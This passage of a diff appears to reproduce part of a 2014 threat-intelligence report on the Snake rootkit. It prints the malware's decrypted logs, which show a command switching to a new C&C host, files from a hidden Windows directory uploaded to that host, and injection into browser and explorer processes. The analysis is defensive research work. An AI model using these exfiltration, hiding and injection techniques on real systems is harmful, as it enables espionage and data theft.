@@ -1,0 +1,57 @@
+↓ [Traffic is decrypted]
+Once decrypted, the malware interprets the received command, as reflected in the malware log below (the new C&C server address
+is highlighted in it):
+03:52:12 Del after 0
+03:52:12 Run instruction: 6 ID:303149772147483647(13:41:34 05/08/2013)
+03:52:12 Add address &marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s&&&
+03:52:12 Finish run instruction.
+After that, the malware connects to the new C&C, asking it for another command:
+03:52:13 1400: Connect marketplace.servehttp.com type(0)... OK
+03:52:13 1400: GET /IMAGE/pub.html
+03:52:15 1400: Http status: 200
+03:52:16 1400: recv 1/1
+03:52:16 DownLoad 1 command(s).
+BAE Systems Applied Intelligence: Snake Rootkit Report 2014 10
+The command it receives is called UpLoad, so it uploads all the collected logs to the server, and then cleans out those logs:
+03:52:16 UpLoad: http upload 4 file(s).
+03:52:17 652: Connect marketplace.servehttp.com type(0)... OK
+03:52:17 652: GET test file /IMAGE/pub.html
+03:52:17 652: POST /IMAGE/2/55198739672286404661840843638320033
+03:52:18 652: C:\WINDOWS\$NtUninstallQ812589$\gstat32.bin 310[B]
+03:52:19 652: Http Status:200
+03:52:19 652: POST /IMAGE/2/32773318678423920155243775957661252
+03:52:19 652: result.xml 1278[B]
+03:52:20 652: Http Status:200
+03:52:21 652: POST /IMAGE/2/41535327538451061594793127961089611
+03:52:21 652: C:\WINDOWS\$NtUninstallQ812589$\mtmon32.sdb 655[B]
+03:52:22 652: Http Status:200
+03:52:22 652: POST /IMAGE/2/35192812459183876172895945534862460
+03:52:22 652: C:\WINDOWS\$NtUninstallQ812589$\mtmon.sdb 748[B]
+03:52:23 652: Http Status:200
+The files it uploads are stored inside its home directory %windows%\$NtUninstallQ[random]$,
+where [random] is a random number.
+For example, Snake’s home directory could be C:\WINDOWS\$NtUninstallQ812589$.
+The files within that directory are used by the rootkit to store configuration and log data.
+When decrypted with the same XOR key that was used by Agent.BTZ, these files expose the following contents:
+• mtmon.sdb - C&C communication log that looks as the logs shown above.
+• mtmon_.sdb - installation log, that shows infected processes (Internet Explorer), the random name of the dropped DLL
+(e.g. kbdfaori.dll), log directory, and the registry entry ShellCore that stores other configuration details:
+03:52:02 TVer=1.2
+03:52:02 Parent:C:\Program Files\Internet Explorer\IEXPLORE.EXE
+03:52:02 ver 3.2.0.0a inj dll K:0 PID:712,
+C:\WINDOWS\system32\kbdfaori.dll,
+hostID:ea5cfa5ea1681bd6(16887647987074341846)
+03:52:02 C:\WINDOWS\$NtUninstallQ812589$,
+Temp:C:\WINDOWS\$NtUninstallQ812589$\SPUNINST\Temp
+03:52:02 REG:Software\Microsoft\Windows\CurrentVersion\ShellCore
+03:52:02 ModuleStart: 03:51:42
+• scmp.bin - pipe server log that shows its assigned name (COMPUTERNAME is the name of the test system) and
+what processes it operates from:
+02:04:24 TVer=1.6
+02:04:24 SPCOMPUTERNAME: Pipe server thread start
+02:04:24 Inj[1620]:explorer.exe
+03:51:42 Inj[712]:iexplore.exe
+• ucmp.bin - another pipe server log:
+02:04:44 TVer=1.6
+02:04:44 UPCOMPUTERNAME: Pipe server thread start
+BAE Systems Applied Intelligence: Snake Rootkit Report 2014 11
